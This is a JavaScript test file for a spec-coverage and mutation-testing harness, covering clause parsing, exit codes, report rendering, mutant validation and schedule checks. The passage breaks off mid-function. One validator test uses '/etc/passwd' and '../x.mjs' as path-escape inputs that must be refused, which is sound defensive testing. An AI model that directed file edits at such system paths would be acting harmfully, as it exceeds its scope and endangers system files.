// watch/freshness/cases/harness.cases.mjs: cases for the harness itself and the schedule (FreshHarness).
//
// Covers FR-H.2 (coverage accounting and the runner's fixed interface), FR-H.6 (the mutation runner and
// the real mutant set), FR-H.8 (REPORT.md), FR-O.1, FR-O.2, FR-O.4, the commit guard for FR-L.5, and the
// workflow half of FR-D.4. Each planted fault is built from synthetic inputs, most in a throwaway tree
// under os.tmpdir() that the case removes before it returns. Real repository files are read through
// ctx.root, so a mutation copy tests itself.
// writes: temporary files only

import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, existsSync, readdirSync, symlinkSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import {
  parseClauses, unparsedClauseLines, runCases, coverage, decideExit, collectMetrics, renderReport, badMetrics,
} from '../harness/run.mjs';
import { validateMutants, applyMutant, coverageGaps, runMutants, loadMutants, REQUIRED } from '../harness/mutate.mjs';
import { parseSchedule, checkSchedule, activeWorkflowText } from '../../../ops/schedule.mjs';
import { writeJobProblems, orderProblems, buildProblems, dependencyProblems, importSpecifiers, runBodyProblems, SYNC } from '../../../ops/write-job.mjs';
import { listArtifact, takeBuildOutput, PATHS } from '../../../ops/take-build-output.mjs';
import { parseYaml } from '../yaml.mjs';
import { staleness, staleLine } from '../../../ops/stale-run.mjs';
import { outsideRegionChange } from '../../../ops/briefs-guard.mjs';

// ---------- small helpers ----------

// Runs fn(dir) with a fresh temporary directory and always removes it.
function withTmp(fn) {
  const dir = mkdtempSync(join(tmpdir(), 'fr-har-'));
  try { return fn(dir); } finally { rmSync(dir, { recursive: true, force: true }); }
}

// The same for an async fn: the directory is removed after the promise settles.
async function withTmpAsync(fn) {
  const dir = mkdtempSync(join(tmpdir(), 'fr-har-'));
  try { return await fn(dir); } finally { rmSync(dir, { recursive: true, force: true }); }
}

function put(dir, rel, text) {
  mkdirSync(dirname(join(dir, rel)), { recursive: true });
  writeFileSync(join(dir, rel), text);
}

// Collects failed checks as strings; a case passes when the list is empty.
function checks() {
  const bad = [];
  const expect = (ok, what) => { if (!ok) bad.push(what); };
  const result = (extra = {}) => ({ pass: bad.length === 0, detail: bad.join('; '), ...extra });
  return { expect, result };
}

const SYN_CLAUSES = new Map([['FR-X.1', 'MUST'], ['FR-X.2', 'SHOULD']]);
const SYN_DISCS = new Map([
  ['DISC-001', { resolution: 'ACCEPTED', review: '2026-12-01', title: 'synthetic', clause: 'FR-X.1' }],
  ['DISC-002', { resolution: null, review: null, title: 'incomplete', clause: 'FR-X.1' }],
]);
const SYN_CTX = { root: '/nonexistent', fixtures: '/nonexistent', golden: () => ({ pass: true }), updating: false };
const syn = (c) => ({ file: 'synthetic.cases.mjs', clauses: ['FR-X.1'], level: 'MUST', title: c.id, ...c });
const runSyn = (cases, discs = SYN_DISCS) => runCases(cases.map(syn), SYN_CLAUSES, discs, SYN_CTX);

async function throwsWith(fn, re) {
  try { await fn(); return false; } catch (e) { return re.test(String(e?.message ?? e)); }
}

// A minimal repository around a copy of the real runner: one clause, one module, one case.
const LIB = 'export function max(a, b) {\n  return a > b ? a : b;\n}\n';
const CASE_FILE = "import { max } from '../lib.mjs';\nexport default [{ id: 'S-max', clauses: ['FR-X.1'], level: 'MUST', title: 'max', run: () => max(2, 1) === 2 && max(1, 2) === 2 }];\n";
function makeTree(dir, root, { spec = '**FR-X.1** (MUST) max returns the larger argument.\n', lib = LIB, cases = CASE_FILE } = {}) {
  put(dir, 'watch/freshness/harness/run.mjs', readFileSync(join(root, 'watch/freshness/harness/run.mjs'), 'utf8'));
  put(dir, 'watch/freshness/SPEC.md', spec);
  put(dir, 'watch/freshness/lib.mjs', lib);
  if (cases !== null) put(dir, 'watch/freshness/cases/s.cases.mjs', cases);
}
function runner(dir, args, env = {}) {
  const r = spawnSync(process.execPath, [join(dir, 'watch/freshness/harness/run.mjs'), ...args], { cwd: dir, encoding: 'utf8', env: { ...process.env, UPDATE_GOLDENS: '', ...env } });
  return { code: r.status, out: `${r.stdout}${r.stderr}` };
}

// ---------- FR-H.2: coverage accounting and planted runner faults ----------

const h2 = [
  {
    id: 'HAR-H2-spec-parse', clauses: ['FR-H.2'], level: 'MUST',
    title: 'the clause list comes from SPEC.md, and a malformed clause line is refused, not skipped',
    run(ctx) {
      const c = checks();
      const text = readFileSync(join(ctx.root, 'watch/freshness/SPEC.md'), 'utf8');
      const clauses = parseClauses(text);
      const boldLines = text.split('\n').filter((l) => /^\*\*FR-[A-Z]\.\d+\*\*/.test(l) && !/RETIRED/.test(l)).length;
      c.expect(clauses.size === boldLines, `parsed ${clauses.size} clauses but SPEC.md has ${boldLines} clause lines`);
      c.expect(unparsedClauseLines(text).length === 0, `unparsed clause lines: ${unparsedClauseLines(text).join(' | ')}`);
      const planted = '**FR-Z.1** (MUST) fine.\n**FR-Z.2** (must) lower case level.\n**FR-Z.3** (RETIRED 2026-10-01) replaced by FR-Z.4.\n';
      c.expect(parseClauses(planted).size === 1, 'planted spec: expected 1 parsed clause');
      c.expect(unparsedClauseLines(planted).length === 1 && unparsedClauseLines(planted)[0].startsWith('**FR-Z.2**'), 'planted lower-case level not reported as unparsed');
      c.expect(throwsWithSync(() => parseClauses('**FR-Z.1** (MUST) a\n**FR-Z.1** (SHOULD) b\n'), /twice/), 'a clause defined twice is not refused');
      return c.result();
    },
  },
  {
    id: 'HAR-H2-coverage-rules', clauses: ['FR-H.2'], level: 'MUST',
    title: 'a MUST clause counts as covered only with a PASS or XFAIL case and no FAIL case',
    run() {
      const c = checks();
      const res = (id, clauses, verdict) => ({ id, clauses, level: 'MUST', verdict, detail: '' });
      const clauses = new Map([['FR-X.1', 'MUST'], ['FR-X.2', 'MUST'], ['FR-X.3', 'MUST'], ['FR-X.4', 'SHOULD']]);
      const results = [res('a', ['FR-X.1'], 'PASS'), res('b', ['FR-X.2'], 'PASS'), res('c', ['FR-X.2'], 'FAIL'), res('d', ['FR-X.4'], 'XFAIL')];
      const [row] = coverage(clauses, results);
      c.expect(JSON.stringify(row.missing) === JSON.stringify(['FR-X.2', 'FR-X.3']), `missing ${JSON.stringify(row.missing)}, expected FR-X.2 (a failing case) and FR-X.3 (no case)`);
      c.expect(row.covered === 2 && row.pass === 1 && row.xfail === 1, `covered/pass/xfail ${row.covered}/${row.pass}/${row.xfail}, expected 2/1/1`);
      c.expect(decideExit({ results: [res('a', ['FR-X.1'], 'PASS')], uncovered: ['FR-X.3'], partial: false }) === 1, 'full run with an uncovered MUST does not exit 1');
      c.expect(decideExit({ results: [res('a', ['FR-X.1'], 'PASS')], uncovered: ['FR-X.3'], partial: true }) === 0, 'a --only run enforces coverage');
      c.expect(decideExit({ results: [], uncovered: [], partial: true }) === 1, 'an empty case set does not exit 1');
      c.expect(decideExit({ results: [res('a', ['FR-X.1'], 'XFAIL')], uncovered: [], partial: false }) === 0, 'an XFAIL-only run does not exit 0');
      c.expect(decideExit({ results: [res('a', ['FR-X.1'], 'FAIL')], uncovered: [], partial: false }) === 1, 'a FAIL does not exit 1');
      return c.result();
    },
  },
  {
    id: 'HAR-H2-planted-faults', clauses: ['FR-H.2'], level: 'MUST',
    title: 'unknown clause, duplicate id, bad level, XFAIL to a missing or incomplete DISC, pass-while-XFAIL, throw, bad metrics',
    async run() {
      const c = checks();
      c.expect(await throwsWith(() => runSyn([{ id: 'u', clauses: ['FR-X.9'], run: () => true }]), /not in SPEC\.md/), 'an unknown clause is not refused');
      c.expect(await throwsWith(() => runSyn([{ id: 'd', run: () => true }, { id: 'd', run: () => true }]), /duplicate case id/), 'a duplicate id is not refused');
      c.expect(await throwsWith(() => runSyn([{ id: 'l', level: 'must', run: () => true }]), /level must be/), 'a bad level is not refused');
      c.expect(await throwsWith(() => runSyn([{ id: 'n', clauses: [], run: () => true }]), /names no clause/), 'a case with no clause is not refused');
      const r = await runSyn([
        { id: 'x-missing', run: () => ({ pass: false, xfail: 'DISC-404' }) },
        { id: 'x-incomplete', run: () => ({ pass: false, xfail: 'DISC-002' }) },
        { id: 'x-ok', run: () => ({ pass: false, xfail: 'DISC-001' }) },
        { id: 'x-passing', run: () => ({ pass: true, xfail: 'DISC-001' }) },
        { id: 'throws', run: () => { throw new Error('boom'); } },
        { id: 'returns-junk', run: () => 'yes' },
        { id: 'metric-name', run: () => ({ pass: true, metrics: { 'Bad Name': 1 } }) },
        { id: 'metric-nan', run: () => ({ pass: true, metrics: { 'fidelity.ci': NaN } }) },
        { id: 'metric-ok', run: () => ({ pass: true, metrics: { 'fidelity.ci': '40/44' } }) },
      ]);
      const v = Object.fromEntries(r.map((x) => [x.id, x]));
      c.expect(v['x-missing'].verdict === 'FAIL', 'XFAIL to a DISC that does not exist is not FAIL');
      c.expect(v['x-incomplete'].verdict === 'FAIL', 'XFAIL to a DISC without Resolution and Review date is not FAIL');
      c.expect(v['x-ok'].verdict === 'XFAIL', 'XFAIL to a complete DISC is not XFAIL');
      c.expect(v['x-passing'].verdict === 'FAIL', 'a passing case that still claims XFAIL is not FAIL');
      c.expect(v.throws.verdict === 'FAIL' && /threw: .*boom/.test(v.throws.detail), 'a throwing case is not FAIL with its message');
      c.expect(v['returns-junk'].verdict === 'FAIL', 'a case returning a string is not FAIL');
      c.expect(v['metric-name'].verdict === 'FAIL' && v['metric-nan'].verdict === 'FAIL', 'malformed metrics do not fail their case');
      c.expect(v['metric-ok'].verdict === 'PASS' && v['metric-ok'].metrics?.['fidelity.ci'] === '40/44', 'a valid metric is not carried on the result');
      c.expect(badMetrics([1]) !== null && badMetrics(undefined) === null, 'badMetrics accepts an array or refuses undefined');
      return c.result();
    },
  },
  {
    id: 'HAR-H2-exit-codes', clauses: ['FR-H.2'], level: 'MUST',
    title: 'the runner as a process: 0 green, 1 on an empty case set or a failure, 2 on a harness error',
    run(ctx) {
      const c = checks();
      withTmp((dir) => {
        makeTree(dir, ctx.root);
        let r = runner(dir, []);
        c.expect(r.code === 0 && /^CASES 1$/m.test(r.out) && /^UNCOVERED_MUST 0$/m.test(r.out), `green tree exited ${r.code}`);
        put(dir, 'watch/freshness/lib.mjs', LIB.replace('a > b', 'a < b'));
        r = runner(dir, []);
        c.expect(r.code === 1 && /^FAILED 1$/m.test(r.out), `a failing case exited ${r.code}`);
        put(dir, 'watch/freshness/lib.mjs', LIB);
        put(dir, 'watch/freshness/SPEC.md', '**FR-X.1** (MUST) max.\n**FR-X.2** (MUST) never tested.\n');
        r = runner(dir, []);
        c.expect(r.code === 1 && /^UNCOVERED_MUST 1$/m.test(r.out), `an uncovered MUST exited ${r.code}`);
        r = runner(dir, ['--only', 'S-']);
        c.expect(r.code === 0 && /^UNCOVERED_MUST not-enforced$/m.test(r.out), `--only with an uncovered MUST exited ${r.code}`);
        r = runner(dir, ['--only', 'NOPE']);
        c.expect(r.code === 1 && /NO CASES/.test(r.out), `--only matching nothing exited ${r.code}`);
        put(dir, 'watch/freshness/SPEC.md', '**FR-X.1** (MUST) max.\n**FR-X.2** (Must) malformed.\n');
        r = runner(dir, []);
        c.expect(r.code === 2 && /cannot read/.test(r.out), `a malformed clause line exited ${r.code}`);
        put(dir, 'watch/freshness/SPEC.md', '**FR-X.1** (MUST) max.\n');
        r = runner(dir, ['--ids', 'S-nope']);
        c.expect(r.code === 2, `--ids naming a missing case exited ${r.code}`);
        r = runner(dir, ['--frobnicate']);
        c.expect(r.code === 2, `an unknown flag exited ${r.code}`);
        rmSync(join(dir, 'watch/freshness/cases'), { recursive: true });
        r = runner(dir, []);
        c.expect(r.code === 1 && /NO CASES/.test(r.out), `no case files exited ${r.code}`);
      });
      return c.result();
    },
  },
];

function throwsWithSync(fn, re) {
  try { fn(); return false; } catch (e) { return re.test(String(e?.message ?? e)); }
}

// ---------- FR-H.8: REPORT.md ----------

const SYN_SPEC = '**FR-X.1** (MUST) one.\n**FR-X.2** (SHOULD) two.\n';
const synResult = (id, verdict, extra = {}) => ({ id, clauses: ['FR-X.1'], level: 'MUST', verdict, detail: verdict === 'XFAIL' ? 'DISC-001 (ACCEPTED): /Users/someone/path' : '/Users/someone/path', title: id, ...extra });

const h8 = [
  {
    id: 'HAR-H8-render', clauses: ['FR-H.8'], level: 'MUST',
    title: 'REPORT.md is order-independent, clock-free, path-free, and says "not measured" instead of zero',
    run() {
      const c = checks();
      const results = [
        synResult('b', 'PASS', { metrics: { 'labelled.n': 0, 'fidelity.ci': '41/44' } }),
        synResult('a', 'XFAIL', { metrics: { 'custom.thing': 3 } }),
        synResult('c', 'PASS', { metrics: { 'labelled.n': 0 } }),
      ];
      const args = { specText: SYN_SPEC, discs: SYN_DISCS, caseFiles: 2 };
      const one = renderReport({ ...args, results });
      const two = renderReport({ ...args, results: [...results].reverse() });
      c.expect(one === two, 'the report depends on the order cases ran in');
      c.expect(!/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}/.test(one), 'the report carries a clock time');
      c.expect(!one.includes('/Users/'), 'the report carries case detail text (machine paths)');
      c.expect(/\| Labelled events: set size \| 0 \|/.test(one), 'a metric reported as 0 is not shown as 0');
      c.expect(/\| Labelled events: precision \| not measured \|/.test(one), 'an unreported metric is not shown as "not measured"');
      c.expect(/\| CI class at the pin[^|]*\| 41\/44 \|/.test(one), 'fidelity.ci is not shown');
      c.expect(/\| labelled\.n \| FR-H\.4 \| 0 \| b \(PASS\), c \(PASS\) \|/.test(one), 'a metric does not name every case that reported it');
      c.expect(/\| custom\.thing \| 3 \| a \(XFAIL\) \|/.test(one), 'an extra metric is not listed under Other metrics');
      for (const h of ['## Summary', '## Spec coverage by section (FR-H.2)', '## Spec coverage by clause', '## Fidelity against the master matrix (FR-H.1)', '## Labelled events (FR-H.4)', '## Replay noise (FR-H.5)', '## Mutation score (FR-H.6)', '## Discrepancies (DISCREPANCIES.md)']) {
        c.expect(one.includes(`\n${h}\n`), `section missing: ${h}`);
      }
      c.expect(/\| FR-X\.1 \| MUST \| PASS \| a \(XFAIL\), b \(PASS\), c \(PASS\) \|/.test(one), 'the per-clause row is wrong');
      c.expect(/\| FR-X\.2 \| SHOULD \| uncovered \| - \|/.test(one), 'an uncovered SHOULD is not shown as uncovered');
      c.expect(/\| DISC-001 \| synthetic \| FR-X\.1 \| ACCEPTED \| 2026-12-01 \| a \|/.test(one), 'a DISC does not list the case that XFAILs on it');
      c.expect(/\| DISC-002 \| incomplete \| FR-X\.1 \| missing \| missing \| - \|/.test(one), 'an incomplete DISC is not shown as missing its fields');
      c.expect(one.endsWith('\n') && !one.endsWith('\n\n'), 'the report does not end with exactly one newline');
      return c.result();
    },
  },
  {
    id: 'HAR-H8-metric-conflict', clauses: ['FR-H.8'], level: 'MUST',
    title: 'two cases reporting one metric with different values is a harness error, not a silent pick',
    run() {
      const c = checks();
      c.expect(throwsWithSync(() => collectMetrics([synResult('a', 'PASS', { metrics: { 'mutation.total': 5 } }), synResult('b', 'PASS', { metrics: { 'mutation.total': 6 } })]), /reported as 5 by a .* and 6 by b/), 'conflicting values are not refused');
      c.expect(collectMetrics([synResult('a', 'PASS', { metrics: { 'mutation.total': 5 } }), synResult('b', 'PASS', { metrics: { 'mutation.total': 5 } })]).get('mutation.total').by.length === 2, 'equal values from two cases are not both credited');
      return c.result();
    },
  },
  {
    id: 'HAR-H8-check-report', clauses: ['FR-H.8'], level: 'MUST',
    title: '--report then --check-report round-trips; a one-byte edit is REPORT_STALE with exit 1; misuse exits 2',
    run(ctx) {
      const c = checks();
      withTmp((dir) => {
        makeTree(dir, ctx.root);
        let r = runner(dir, ['--check-report']);
        c.expect(r.code === 1 && /REPORT_STALE .*missing/.test(r.out), `a missing REPORT.md exited ${r.code}`);
        r = runner(dir, ['--report']);
        c.expect(r.code === 0 && existsSync(join(dir, 'watch/freshness/REPORT.md')), `--report exited ${r.code}`);
        r = runner(dir, ['--check-report']);
        c.expect(r.code === 0 && /^REPORT_OK /m.test(r.out), `--check-report after --report exited ${r.code}`);
        const path = join(dir, 'watch/freshness/REPORT.md');
        writeFileSync(path, readFileSync(path, 'utf8').replace('| 1 | 1 | 0 | 0 |', '| 1 | 1 | 0 | 1 |'));
        r = runner(dir, ['--check-report']);
        c.expect(r.code === 1 && /REPORT_STALE .*line \d+/.test(r.out), `a hand-edited REPORT.md exited ${r.code}`);
        put(dir, 'watch/freshness/SPEC.md', '**FR-X.1** (MUST) max, reworded.\n');
        runner(dir, ['--report']);
        put(dir, 'watch/freshness/SPEC.md', '**FR-X.1** (MUST) max.\n');
        r = runner(dir, ['--check-report']);
        c.expect(r.code === 1 && /REPORT_STALE/.test(r.out), `a report from another spec text exited ${r.code}`);
        c.expect(runner(dir, ['--report', '--only', 'S']).code === 2, '--report with --only is not refused');
        c.expect(runner(dir, ['--report'], { UPDATE_GOLDENS: '1' }).code === 2, '--report while updating goldens is not refused');
      });
      return c.result();
    },
  },
];

// ---------- FR-H.6: mutation runner and the real mutant set ----------

const SYN_MUTANTS = [
  { id: 'M-kill', file: 'watch/freshness/lib.mjs', find: 'a > b ? a : b', replace: 'a < b ? a : b', clauses: ['FR-X.1'], must_fail: ['S-max'] },
  { id: 'M-equivalent', file: 'watch/freshness/lib.mjs', find: 'a > b', replace: 'a >= b', clauses: ['FR-X.1'], must_fail: ['S-max'] },
  { id: 'M-absent', file: 'watch/freshness/lib.mjs', find: 'a * b', replace: 'a / b', clauses: ['FR-X.1'], must_fail: ['S-max'] },
  { id: 'M-twice', file: 'watch/freshness/lib.mjs', find: ' b', replace: ' c', clauses: ['FR-X.1'], must_fail: ['S-max'] },
  { id: 'M-crash', file: 'watch/freshness/lib.mjs', find: 'export function max', replace: 'export function mux', clauses: ['FR-X.1'], must_fail: ['S-max'] },
];

const h6 = [
  {
    id: 'HAR-H6-runner', clauses: ['FR-H.6'], level: 'MUST',
    title: 'the mutation runner kills a real mutant, reports a survivor, and refuses absent, ambiguous and crashing mutants',
    async run(ctx) {
      const c = checks();
      await withTmpAsync(async (dir) => {
        makeTree(dir, ctx.root);
        const all = await runMutants({ root: dir, mutants: SYN_MUTANTS, copy: ['watch'], required: {}, workers: 2 });
        const s = Object.fromEntries(all.results.map((r) => [r.id, r.status]));
        c.expect(all.baseline.length === 0, `baseline: ${all.baseline.join('; ')}`);
        c.expect(s['M-kill'] === 'KILLED', `M-kill is ${s['M-kill']}`);
        c.expect(s['M-equivalent'] === 'SURVIVED', `the equivalent mutant is ${s['M-equivalent']}`);
        c.expect(s['M-absent'] === 'ERROR' && s['M-twice'] === 'ERROR', `absent/ambiguous find: ${s['M-absent']}/${s['M-twice']}`);
        c.expect(s['M-crash'] === 'ERROR', `a mutant that breaks the import is ${s['M-crash']}, not ERROR`);
        c.expect(!all.ok && all.killed === 1 && all.total === 5 && all.workers === 2, `ok ${all.ok}, killed ${all.killed}/${all.total}, workers ${all.workers}`);
        c.expect(all.results.map((r) => r.id).join() === SYN_MUTANTS.map((m) => m.id).join(), 'results are not in mutants.json order');
        c.expect(readFileSync(join(dir, 'watch/freshness/lib.mjs'), 'utf8') === LIB, 'the source tree was modified');
        const one = await runMutants({ root: dir, mutants: [SYN_MUTANTS[0]], copy: ['watch'], required: {} });
        c.expect(one.ok && one.killed === 1, `a set of one killed mutant is not ok (${one.killed}/${one.total})`);
        const gap = await runMutants({ root: dir, mutants: [SYN_MUTANTS[0]], copy: ['watch'], required: { 'FR-X.1': 2 } });
        c.expect(!gap.ok && gap.gaps[0] === 'FR-X.1 needs 2, has 1', `a clause gap is not reported: ${gap.gaps.join('; ')}`);
        c.expect(!(await runMutants({ root: dir, mutants: [], copy: ['watch'], required: {} })).ok, 'an empty mutant set is ok');
        put(dir, 'watch/freshness/lib.mjs', LIB.replace('a > b', 'a < b'));
        const base = await runMutants({ root: dir, mutants: [SYN_MUTANTS[0]], copy: ['watch'], required: {} });
        c.expect(!base.ok && base.results.length === 0 && /S-max is FAIL before any mutation/.test(base.baseline.join()), 'a failing baseline still judged mutants');
      });
      return c.result();
    },
  },
  {
    id: 'HAR-H6-validate', clauses: ['FR-H.6'], level: 'MUST',
    title: 'malformed mutant entries are refused before anything runs',
    run() {
      const c = checks();
      const ok = SYN_MUTANTS[0];
      const bad = [
        [[ok, ok], /duplicate id/], [[{ ...ok, must_fail: [] }], /must_fail/], [[{ ...ok, clauses: [] }], /clauses/],
        [[{ ...ok, replace: ok.find }], /nothing is mutated/], [[{ ...ok, file: '/etc/passwd' }], /relative path/],
        [[{ ...ok, file: '../x.mjs' }], /relative path/], [[{ ...ok, find: '' }], /find/], [{}, /array/],
      ];
      for (const [list, re] of bad) c.expect(throwsWithSync(() => validateMutants(list), re), `not refused: ${JSON.stringify(list).slice(0, 60)}`);
      c.expect(applyMutant('x a y', { id: 't', file: 'f', find: 'a', replace: 'b' }) === 'x b y', 'applyMutant does not replace exactly once');
      c.expect(coverageGaps([]).length === Object.keys(REQUIRED).length, 'an empty set does not miss every required clause');
      return c.result();
    },
  },
  {
    id: 'HAR-H6-mutants', clauses: ['FR-H.6'], level: 'MUST',
    title: 'every mutant in harness/mutants.json is killed by its named cases, and the set covers the clauses FR-H.6 names',
    async run(ctx) {
      if (process.env.FRESH_MUTATION_CHILD) return { pass: false, detail: 'refused: this case runs the mutation runner and cannot run inside a mutant copy' };
      const mutants = loadMutants(join(ctx.root, 'watch/freshness/harness/mutants.json'));
      const res = await runMutants({ root: ctx.root, mutants });
      const bad = [...res.baseline, ...res.gaps, ...res.results.filter((r) => r.status !== 'KILLED').map((r) => `${r.status} ${r.id}: ${r.detail}`)];
      return {
        pass: res.ok,
        detail: `${res.killed}/${res.total} killed in ${res.seconds.toFixed(1)} s${bad.length ? `; ${bad.join('; ')}` : ''}`,
        metrics: { 'mutation.killed': res.killed, 'mutation.total': res.total },
      };
    },
  },
];

// ---------- FR-O.1, FR-O.2: the schedule ----------

const SCHED_HEAD = 'artifact\tgenerator\tworkflow\tcadence\tgate\tsnapshot_built\n';
function schedBase(dir) {
  put(dir, 'ops/schedule.tsv', `# comment\n${SCHED_HEAD}out/a.json\tnode gen.mjs --x\t.github/workflows/w.yml\tdaily\tZ9\t-\n`);
  put(dir, '.github/workflows/w.yml', 'jobs:\n  a:\n    steps:\n      - run: |\n          node gen.mjs --x\n');
  put(dir, 'site/scripts/verify-site.sh', 'echo "== Z9 thing =="\n');
  put(dir, 'watch/freshness/gen.mjs', "// writes: out/a.json\nimport { writeFileSync } from 'node:fs';\nwriteFileSync('out/a.json', '{}');\n");
  put(dir, 'watch/freshness/fixtures/PROVENANCE.md', '# Provenance\n');
}

const o = [
  {
    id: 'HAR-O1-rows', clauses: ['FR-O.1'], level: 'MUST',
    title: 'ops/schedule.tsv is well formed and has a row for each artifact FR-O.1 names today',
    run(ctx) {
      const c = checks();
      const { rows, problems } = parseSchedule(readFileSync(join(ctx.root, 'ops/schedule.tsv'), 'utf8'));
      c.expect(problems.length === 0, problems.join('; '));
      const has = (re) => rows.some((r) => re.test(r.artifact));
      c.expect(has(/^watch\/live\.json$/), 'no row for watch/live.json');
      c.expect(has(/^watch\/crossings\.jsonl$/), 'no row for watch/crossings.jsonl');
      c.expect(has(/^site\/briefs\/\*\.html \(live:card regions\)$/), 'no row for the live:card regions');
      c.expect(has(/^site\/feed\.xml \(weekly digest entries\)$/), 'no row for the weekly digest entries');
      const plants = [
        ['artifact\tgenerator\n', /header must be/], [`${SCHED_HEAD}a\tb\tc\tdaily\tW3\n`, /5 columns/],
        [`${SCHED_HEAD}a\tb\tc\thourly\tW3\t-\n`, /cadence/], [`${SCHED_HEAD}a\tb\tc\tdaily\tW3\t2026-9-1\n`, /snapshot_built/],
        [`${SCHED_HEAD}a\tb\tc\tdaily\tW3\t-\na\tb\tc\tdaily\tW3\t-\n`, /listed twice/], [SCHED_HEAD, /no rows/],
        [`${SCHED_HEAD}a\t\tc\tdaily\tW3\t-\n`, /empty generator/],
      ];
      for (const [text, re] of plants) c.expect(parseSchedule(text).problems.some((p) => re.test(p)), `planted ${re} not reported`);
      c.expect(parseSchedule(`${SCHED_HEAD}a\tb\tc\tweekly\tW3\t2026-09-01\n`).problems.length === 0, 'a snapshot row with a date is refused');
      return c.result();
    },
  },
  {
    id: 'HAR-O2-planted', clauses: ['FR-O.2'], level: 'MUST',
    title: 'the schedule check fails on an unscheduled generator, a missing gate, an undeclared writer, an unlisted artifact and an unnamed fixture recorder',
    run() {
      const c = checks();
      const plants = [
        ['clean tree', () => {}, null],
        ['generator only in a YAML comment', (d) => put(d, '.github/workflows/w.yml', 'jobs:\n  a:\n    steps:\n      # - run: node gen.mjs --x\n      - run: echo hi\n'), /is not run by/],
        ['generator missing', (d) => put(d, '.github/workflows/w.yml', 'jobs: {}\n'), /is not run by/],
        ['workflow missing', (d) => rmSync(join(d, '.github/workflows/w.yml')), /does not exist/],
        ['gate missing', (d) => put(d, 'site/scripts/verify-site.sh', 'echo "== Z10 other =="\n'), /gate Z9 is not in/],
        ['writer without a header (fs.promises)', (d) => put(d, 'watch/freshness/sneaky.mjs', "import fs from 'node:fs';\nawait fs.promises.writeFile('watch/x.json', '1');\n"), /sneaky\.mjs: calls a file-writing API but has no/],
        ['writer without a header (rmSync, nested dir)', (d) => put(d, 'watch/freshness/harness/tidy.mjs', "import { rmSync } from 'node:fs';\nrmSync('x');\n"), /tidy\.mjs: calls a file-writing API/],
        ['make-live without a header', (d) => put(d, 'site/scripts/make-live.mjs', "import { writeFileSync } from 'node:fs';\nwriteFileSync('site/briefs/a.html', '');\n"), /make-live\.mjs: calls a file-writing API/],
        ['declared artifact without a row', (d) => put(d, 'watch/freshness/more.mjs', "// writes: out/b.json\nimport { writeFileSync } from 'node:fs';\n"), /writes out\/b\.json, which has no row/],
        ['fixture recorder missing from PROVENANCE.md', (d) => put(d, 'watch/freshness/rec.mjs', "// writes: fixtures (manual record, see PROVENANCE.md)\nimport { writeFileSync } from 'node:fs';\n"), /rec\.mjs: records fixtures but .* does not name rec\.mjs/],
        ['fixture recorder named in PROVENANCE.md', (d) => { put(d, 'watch/freshness/rec.mjs', "// writes: fixtures (manual record, see PROVENANCE.md)\nimport { writeFileSync } from 'node:fs';\n"); put(d, 'watch/freshness/fixtures/PROVENANCE.md', '# Provenance\nRecorded by `node watch/freshness/rec.mjs --record`.\n'); }, null],
        ['golden writer', (d) => put(d, 'watch/freshness/g.mjs', "// writes: goldens (UPDATE_GOLDENS=1)\nimport { writeFileSync } from 'node:fs';\n"), null],
        ['schedule missing', (d) => rmSync(join(d, 'ops/schedule.tsv')), /schedule\.tsv is missing/],
      ];
      for (const [name, plant, want] of plants) {
        withTmp((dir) => {
          schedBase(dir);
          plant(dir);
          const p = checkSchedule(dir).problems;
          if (want === null) c.expect(p.length === 0, `${name}: unexpected ${p.join(' | ')}`);
          else c.expect(p.some((x) => want.test(x)), `${name}: not reported (got ${p.join(' | ') || 'nothing'})`);
        });
      }
      c.expect(activeWorkflowText('a\n  # b\nc') === 'a\nc', 'comment lines are not dropped');
      return c.result();
    },
  },
  {
    id: 'HAR-O2-repository', clauses: ['FR-O.2', 'FR-O.1'], level: 'MUST',
    title: 'this repository passes the schedule check: each generator runs in its workflow, each gate exists, each writer is declared',
    run(ctx) {
      const r = checkSchedule(ctx.root);
      return { pass: r.problems.length === 0 && r.rows.length > 0, detail: r.problems.length ? r.problems.join('; ') : `${r.rows.length} rows, ${r.scripts} scripts scanned, ${r.writers} writers` };
    },
  },
  {
    id: 'HAR-O4-stale-run', clauses: ['FR-O.4'], level: 'SHOULD',
    title: 'the deploy smoke step warns when watch/live.json is more than 36 hours old',
    run(ctx) {
      const c = checks();
      const at = '2026-09-24T11:23:00Z';
      c.expect(!staleness(at, '2026-09-25T23:23:00Z').stale, 'exactly 36 h is stale');
      c.expect(staleness(at, '2026-09-25T23:23:01Z').stale, '36 h and one second is not stale');
      c.expect(!staleness(at, '2026-09-24T11:23:00Z').stale, 'zero age is stale');
      c.expect(staleness(at, '2026-09-24T11:22:59Z').stale, 'a checked_at in the future is not stale');
      c.expect(staleness('2026-09-24', '2026-09-24T12:00:00Z').stale && staleness(undefined, '2026-09-24T12:00:00Z').stale, 'a malformed checked_at is not stale');
      withTmp((dir) => {
        c.expect(/^::warning title=Missed daily watch::.*missing/.test(staleLine(join(dir, 'live.json'), '2026-09-25T00:00:00Z')), 'a missing live.json does not warn');
        writeFileSync(join(dir, 'live.json'), '{"checked_at":"2026-09-24T11:23:00Z"}\n');
        c.expect(/^::warning title=Missed daily watch::.*37\.0 h old/.test(staleLine(join(dir, 'live.json'), '2026-09-26T00:23:00Z')), 'a 37 h old run does not warn with its age');
        c.expect(/^LIVE_FRESH /.test(staleLine(join(dir, 'live.json'), '2026-09-24T12:23:00Z')), 'a 1 h old run warns');
        writeFileSync(join(dir, 'live.json'), '{');
        c.expect(/^::warning .*not JSON/.test(staleLine(join(dir, 'live.json'), '2026-09-24T12:23:00Z')), 'broken JSON does not warn');
      });
      const deploy = readFileSync(join(ctx.root, '.github/workflows/deploy.yml'), 'utf8');
      const step = deploy.slice(deploy.indexOf('- name: Smoke test'));
      const body = step.slice(0, step.indexOf('\n      - name:', 1) > 0 ? step.indexOf('\n      - name:', 1) : undefined);
      c.expect(deploy.includes('- name: Smoke test') && activeWorkflowText(body).includes('node ops/stale-run.mjs watch/live.json'), 'deploy.yml smoke step does not run ops/stale-run.mjs on watch/live.json');
      return c.result();
    },
  },
];

// ---------- FR-D.4 (workflow half) and FR-L.5 (commit guard) ----------

// The problems with a watch workflow text: it must run the watch with --apply and never the retired
// --issues path, and it must guard the brief commit.
export function watchWorkflowProblems(text) {
  const active = activeWorkflowText(text);
  const out = [];
  if (!active.includes('node watch/watch.mjs --apply')) out.push('does not run `node watch/watch.mjs --apply`');
